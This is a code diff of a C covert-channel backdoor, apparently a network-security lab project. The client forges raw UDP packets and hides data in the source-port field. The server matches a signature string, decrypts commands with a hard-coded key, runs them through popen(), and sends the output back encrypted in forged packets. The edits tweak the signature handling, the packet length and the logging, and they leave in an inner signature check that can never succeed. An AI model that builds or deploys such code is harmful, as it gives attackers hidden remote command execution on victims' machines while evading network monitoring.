@@ -184,7 +184,8 @@ void client(unsigned int source_addr, unsigned int dest_addr, unsigned short des
     int send_socket;
     struct sockaddr_in sin;
     struct send_udp send_udp;
-    // fprintf(stdout, "Data: %x \n", data);
+
+    strcpy(send_udp.buffer, SIGNATURE);
 
     for (int i = 0; i <= data_len; i++)
     {
@@ -212,8 +213,6 @@ void client(unsigned int source_addr, unsigned int dest_addr, unsigned short des
         send_udp.ip.saddr = source_addr;
         send_udp.ip.daddr = dest_addr;
         send_udp.udp.len = htons(8);
-
-        strcpy(send_udp.buffer, SIGNATURE);
 
         /* forge destination port */
         send_udp.udp.dest = htons(dest_port);
@@ -256,7 +255,7 @@ void client(unsigned int source_addr, unsigned int dest_addr, unsigned short des
         send_udp.udp.check = in_cksum((unsigned short *)&pseudo_header, 32);
 
         /* Away we go.... */
-        sendto(send_socket, &send_udp, 28, 0, (struct sockaddr *)&sin, sizeof(sin));
+        sendto(send_socket, &send_udp, 31, 0, (struct sockaddr *)&sin, sizeof(sin));
 
         close(send_socket);
     }
@@ -295,6 +294,7 @@ void server(unsigned int source_addr, unsigned int dest_addr, unsigned short des
     int packet_count = 0;
 
     fprintf(stdout, "Backdoor Open..\n");
+
     while (open) /* read packet loop */
     {
         /* Open socket for reading */
@@ -310,15 +310,16 @@ void server(unsigned int source_addr, unsigned int dest_addr, unsigned short des
         read(recv_socket, (struct recv_udp *)&recv_packet, 9999);
 
         // corect dp and correct flag
-        if (ntohs(recv_packet.udp.dest) == dest_port)
+        if (ntohs(recv_packet.udp.dest) == dest_port && strcmp(recv_packet.buffer, SIGNATURE) == 0)
         {
-            if (strcmp(recv_packet.buffer, SIGNATURE) == 0)
+            if (strcmp(recv_packet.buffer, SIGNATURE) != 0)
             {
-                fprintf(stdout, "Signature Good\n");
+                fprintf(stdout, "FAIL: %s\n", recv_packet.buffer);
             }
 
             temp = ntohs(recv_packet.udp.source);
             fprintf(stdout, "Received: %d of %d : %d\n", packet_count, size, temp);
+            memset(recv_packet.buffer, 0, 1000);
 
             if (packet_count == 0)
             {
@@ -342,7 +343,7 @@ void server(unsigned int source_addr, unsigned int dest_addr, unsigned short des
                     char *decryptedtext = (char *)malloc(size);
                     decrypt((unsigned char *)commandBuffer, size, (unsigned char *)KEY, (unsigned char *)IV, (unsigned char *)decryptedtext);
 
-                    fprintf(stdout, "Decypher: \n%s\n\n", decryptedtext);
+                    fprintf(stdout, "Decypher Command: \n%s\n\n", decryptedtext);
 
                     // if Backdoor EXECUTE command
                     if (isBackdoor)
@@ -350,7 +351,7 @@ void server(unsigned int source_addr, unsigned int dest_addr, unsigned short des
                         char *output = (char *)malloc(OUTPUT_SIZE);
                         fp = popen(decryptedtext, "r");
                         fread(output, 1, OUTPUT_SIZE, fp);
-                        fprintf(stdout, "Return: %s \n", output);
+
                         // Cypher
                         unsigned char *ciphertext = (unsigned char *)malloc(OUTPUT_SIZE * 2);
                         int cypher_len = forgepacket(ciphertext, output, OUTPUT_SIZE);
@@ -368,7 +369,7 @@ void server(unsigned int source_addr, unsigned int dest_addr, unsigned short des
 
         close(recv_socket); /* close the socket so we don't hose the kernel */
     }
-    fprintf(stdout, "Backdoor Closed");
+    fprintf(stdout, "Backdoor Closed.\n\n");
 }
 
 /*--------------------------------------------------------------------------
